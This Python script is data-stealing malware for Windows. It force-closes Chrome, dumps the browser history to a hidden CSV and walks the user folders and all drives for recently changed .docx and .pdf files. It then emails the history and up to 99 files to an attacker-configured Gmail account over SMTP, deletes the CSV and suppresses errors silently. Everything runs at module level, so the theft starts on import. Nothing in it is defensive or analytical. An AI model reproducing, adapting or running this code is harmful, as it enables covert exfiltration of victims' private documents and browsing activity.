import mimetypes
import time
import smtplib
from email.message import EmailMessage
import csv
import os
import browserhistory as bh

# The mail addresses and password

SENDER = ""  # Syntax: <Example.email1@gmail.com>
SENDER_P = ""  # App password here, 16-character code, all lowercase and no space, Syntax: "<totallyyrealpass>"
RECEIVER = ""  # Syntax: <Example.email2@gmail.com>

def get_chrome_history():
    # close chrome if it is open
    try:
        os.system("taskkill /f /im chrome.exe")
    except Exception:  # NOQA
        pass
    
    # copy getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\History", "rb" to temp folder
    try:
        dict_obj = bh.get_browserhistory()
    except Exception:  # NOQA
        pass
    
    
    while True:
        try:
            if not os.path.exists("C:\\temp") or not os.path.isfile("C:\\temp\\.tempcache.csv"):
                try:
                    os.mkdir("C:\\temp\\")
                except Exception:  # NOQA
                    pass
                try:
                    open("C:\\temp\\.tempcache.csv", "w").close()
                except Exception:  # NOQA
                    pass

            # write to csv file but don't delete the previous data
            with open("C:\\temp\\.tempcache.csv", mode='a', newline='',
                      encoding='utf-8') as decrypt_password_file:
                decrypt_password_writer = csv.writer(decrypt_password_file, delimiter=',', quotechar='"',
                                                     quoting=csv.QUOTE_MINIMAL)
                decrypt_password_writer.writerow(dict_obj['chrome'][i])
            i += 1
        except Exception as e:  # NOQA
            print(e)
            break

def clairvoyance():
    """
    Get all the name of the files in the pc
    """
    # Get the current pc username
    user = os.getlogin()
    file_set = set()
    # Requirements for files
    DETECT_TUPLE = (f"C:\\Users\\{user}\\Downloads", f"C:\\Users\\{user}\\Desktop", f"C:\\Users\\{user}\\Documents",
                    f"C:\\Users\\{user}\\Pictures", f"C:\\Users\\{user}\\Videos",
                    f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Recent")
    EXTENSION = (".docx", ".pdf")  # Detect the extension name
    DETECT_KEYWORD = ("", )  # detect any keywords within the file, make it lowercase.
    days = 20  # How many days since last modified back to search

    # Add the rest of the drives to the tuple
    drives = [chr(x) + ":" for x in range(65, 91) if os.path.exists(chr(x) + ":")]
    drives.remove("C:")
    # add \\
    drives = [x + "\\" for x in drives]
    DETECT_TUPLE += tuple(drives)

    # Get all the files in the pc
    for path in DETECT_TUPLE:
        for root, dirs, files in os.walk(path):
            for file in files:
                if file.endswith(EXTENSION) and (not file.startswith("~$")) and \
                        (any(x in file.lower() for x in DETECT_KEYWORD)):
                    try:
                        # get the last modified time of the file
                        last_modified = os.path.getmtime(os.path.join(root, file))
                        if time.time() - last_modified < days * 24 * 60 * 60:  # check if it's in the last x days
                            file_set.add(os.path.join(root, file))  # add it to the set
                            # Limit the number of files to 99
                            if file_set.__len__() >= 99:
                                break
                    except Exception:  # NOQA
                        pass
    return file_set

def send_priority(subject, filename):
    msg = EmailMessage()
    msg["Subject"] = f"Report, Date: {time.strftime('%d/%m/%Y')}"
    msg["From"] = SENDER
    msg["To"] = RECEIVER
    msg.set_content(f"{subject} for {os.getlogin()}")

    try:
        # attach the csv file
        with open(filename, "rb") as f:
            if f is None:
                return None

            ctype, encoding = mimetypes.guess_type(filename)
            if ctype is None or encoding is not None:
                ctype = "application/octet-stream"
            maintype, subtype = ctype.split("/", 1)

            file_data = f.read()
            file_name = f.name.split("\\")[-1]
            msg.add_attachment(file_data, maintype=maintype, subtype=subtype, filename=file_name)

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(SENDER, SENDER_P)
            smtp.send_message(msg)
            smtp.quit()

        os.remove(filename)
    except Exception:  # NOQA
        pass

def access_and_send(*args):
    """
    Access the files and send it through SMTPlib
    """
    counter = 0

    msg = EmailMessage()
    msg["Subject"] = f"Files, Date: {time.strftime('%d/%m/%Y')}"
    msg["From"] = SENDER
    msg["To"] = RECEIVER
    msg.set_content(f"Report for {time.strftime('%d/%m/%Y')}, desktop name: {os.getlogin()}")
    
    for i in args:
        for j in i:
            if j is None:
                continue
            try:
                with open(j, "rb") as f:
                    ctype, encoding = mimetypes.guess_type(j)
                    if ctype is None or encoding is not None:
                        ctype = "application/octet-stream"
                    maintype, subtype = ctype.split("/", 1)

                    file_data = f.read()
                    file_name = f.name.split("\\")[-1]
                    msg.add_attachment(file_data, maintype=maintype, subtype=subtype, filename=file_name)
            except Exception:  # NOQA
                pass

            counter += 1
            if counter == 10:
                with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
                    smtp.login(SENDER, SENDER_P)
                    smtp.send_message(msg)
                    smtp.quit()
                counter = 0

        # Once the loop finishes, send the remaining
        if counter != 0:
            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
                smtp.login(SENDER, SENDER_P)
                smtp.send_message(msg)
                smtp.quit()
            counter = 0

# Do not do __main__
priority_files = []
try:
    get_chrome_history()
except Exception:  # NOQA
    pass
try:
    send_priority("Chrome History", "C:\\temp\\.tempcache.csv")
except Exception:  # NOQA
    time.sleep(20)
    send_priority("Chrome History", "C:\\temp\\.tempcache.csv")
try:
    access_and_send(priority_files)
except Exception:  # NOQA
    pass
try:
    access_and_send(clairvoyance())
except Exception:  # NOQA
    pass
